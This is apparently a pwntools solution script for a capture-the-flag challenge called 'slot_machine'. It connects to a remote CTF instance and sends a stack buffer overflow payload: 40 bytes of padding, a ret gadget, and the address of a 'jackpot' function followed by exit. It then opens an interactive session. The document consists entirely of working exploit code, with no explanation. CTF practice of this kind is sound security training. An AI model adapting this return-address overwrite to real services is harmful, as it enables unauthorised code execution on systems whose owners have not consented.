from pwn import *

context.binary = elf = ELF("./slot_machine")

HOST = "instancer.dalctf2026.com"
PORT = 25620

io = remote(HOST, PORT)

ret = 0x40101a
jackpot = elf.symbols["jackpot"]
exit_plt = elf.plt["exit"]

payload = b"A" * 40
payload += p64(ret)
payload += p64(jackpot)
payload += p64(exit_plt)

io.sendlineafter(b"> ", payload)
io.sendlineafter(b"> ", b"exit")
io.interactive()